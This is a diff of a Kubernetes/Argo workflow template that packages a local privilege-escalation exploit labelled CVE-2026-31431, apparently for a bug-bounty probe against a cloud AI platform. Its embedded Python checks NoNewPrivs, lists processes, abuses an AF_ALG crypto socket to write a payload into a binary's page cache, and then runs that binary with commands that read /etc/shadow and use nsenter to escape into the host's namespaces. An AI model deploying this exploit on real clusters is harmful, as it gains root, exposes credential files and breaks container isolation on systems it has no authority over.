@@ -1,28 +1,23 @@
-apiVersion: ai.sap.com/v1alpha1
+apiVersion: argoproj.io/v1alpha1
 kind: WorkflowTemplate
 metadata:
   name: cve31431-wf
   labels:
-    scenarios.ai.sap.com/id: "cve31431-wf"
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "cve31431-wf"
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
     executables.ai.sap.com/name: "cve31431-wf"
-    executables.ai.sap.com/description: "CVE-2026-31431 workflow LPE probe"
+    executables.ai.sap.com/description: "CVE-2026-31431 training job LPE probe"
 spec:
-  imagePullSecrets: []
-  entrypoint: main
   templates:
-  - name: main
-    steps:
-    - - name: exploit
-        template: exploit-step
-  - name: exploit-step
+  - name: exploit
     container:
       image: python:3.11
-      command: [python3, -c]
+      command: ["/bin/sh", "-c"]
       args:
       - |
+        python3 - << 'PYEOF'
         import os, sys, socket, struct, subprocess, zlib
 
         def r(k, v): print(f"[WFTRAIN] {k}: {str(v)[:4000]}", flush=True)
@@ -43,7 +38,6 @@ spec:
         r("NONEWPRIVS_VALUE", str(no_new_privs))
         r("EXPLOIT_VIABLE", str(no_new_privs == 0))
 
-        # All visible PIDs and their NNP
         for pid in sorted(os.listdir("/proc")):
             if not pid.isdigit(): continue
             try:
@@ -54,9 +48,8 @@ spec:
                 r(f"PID_{pid}", f"name={name[0].split(':')[1].strip() if name else '?'} uid={uid[0].split(':')[1].strip() if uid else '?'} nnp={nnp[0].split(':')[1].strip() if nnp else '?'}")
             except: pass
 
-        r("PHASE", "2-EXPLOIT" if no_new_privs == 0 else "2-SKIP (NoNewPrivs=1)")
-
         if no_new_privs == 0:
+            r("PHASE", "2-EXPLOIT")
             AF_ALG, SOCK_SEQPACKET = 38, 5
             SOL_ALG = 279
             alg_name = "authencesn(hmac(sha256),cbc(aes))"
@@ -98,18 +91,15 @@ spec:
                     write4(fd, i, payload[i:i+4])
                     i += 4
                 r("PAGE_CACHE_WRITE", "COMPLETE")
-
                 proc = subprocess.Popen([target], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 out, err = proc.communicate(
-                    b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\ncat /proc/1/root/etc/passwd 2>&1\nnsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n",
+                    b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\nnsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n",
                     timeout=30)
                 r("SHELL_STDOUT", out.decode("utf-8","replace") or "(empty)")
-                r("SHELL_STDERR", err.decode("utf-8","replace") or "(empty)")
                 r("SHELL_RC", str(proc.returncode))
-
-                if os.geteuid() == 0:
-                    r("ROOT", "YES — PRIVILEGE ESCALATION CONFIRMED")
-                else:
-                    r("ROOT", f"NO — uid={os.getuid()}")
+                r("ROOT", "YES" if os.geteuid() == 0 else f"NO uid={os.getuid()}")
+        else:
+            r("PHASE", "2-SKIPPED")
 
         r("DONE", "complete")
+        PYEOF
